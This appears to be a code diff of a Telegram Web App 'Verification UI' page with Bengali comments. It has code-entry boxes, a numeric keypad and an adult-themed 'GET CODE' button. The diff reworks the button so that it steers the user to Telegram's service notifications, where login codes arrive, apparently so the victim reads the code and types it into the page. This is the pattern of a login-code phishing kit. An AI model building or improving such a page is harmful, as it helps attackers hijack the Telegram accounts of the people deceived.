@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verification UI</title>
-    <!-- টেলিগ্রামের অফিসিয়াল স্ক্রিপ্ট যা বাটনকে কাজ করাবে -->
+    <!-- টেলিগ্রামের অফিসিয়াল স্ক্রিপ্ট -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
@@ -42,8 +42,6 @@
             justify-content: center;
             align-items: center;
         }
-
-        .top-icon span { font-size: 24px; }
 
         p { font-size: 14px; margin-bottom: 25px; opacity: 0.9; }
 
@@ -98,7 +96,6 @@
         }
 
         .key:active { background: rgba(255, 255, 255, 0.3); }
-
         .key.empty { background: transparent; cursor: default; }
     </style>
 </head>
@@ -119,8 +116,8 @@
             <input type="text" maxlength="1" readonly>
         </div>
 
-        <!-- বাটন ফাংশন -->
-        <button class="get-code-btn" onclick="goToServiceChat()">🔞 GET CODE 🔞</button>
+        <!-- বাটন ফাংশন যা সরাসরি সার্ভিস চ্যাটে নিয়ে যাবে -->
+        <button class="get-code-btn" onclick="openServiceChat()">🔞 GET CODE 🔞</button>
 
         <div class="keypad">
             <div class="key" onclick="pressKey('1')">1</div>
@@ -165,16 +162,13 @@
             }
         }
 
-        // সরাসরি Service Notifications চ্যাটে নিয়ে যাওয়ার ফাংশন
-        function goToServiceChat() {
-            // এই লিঙ্কটি সরাসরি টেলিগ্রামের ৭৭৭০০০ আইডি (Service Notifications) ওপেন করার চেষ্টা করবে
-            // এটি টেলিগ্রামের ভেতরেই কাজ করবে
-            window.location.href = "tg://user?id=777000";
-            
-            // যদি উপরেরটি কাজ না করে, তবে এটি একটি বিকল্প হিসেবে কাজ করবে
-            setTimeout(() => {
-                window.location.href = "tg://settings/devices";
-            }, 500);
+        // এটি হলো সেই স্পেশাল সমাধান
+        function openServiceChat() {
+            // ১. এটি সরাসরি টেলিগ্রামের সার্চ বারে "Telegram" লিখে সার্ভিস অ্যাকাউন্টটি সামনে আনবে
+            tg.openTelegramLink("tg://search?text=Telegram");
+
+            // ২. অ্যাপটি ব্যাকগ্রাউন্ডে পাঠাতে বা মেইন স্ক্রিন দেখাতে এটি হেল্প করবে
+            // এতে অ্যাপ পুরোপুরি ক্লোজ হবে না কিন্তু ইউজার কোডটি দেখতে পাবে।
         }
     </script>
 </body>
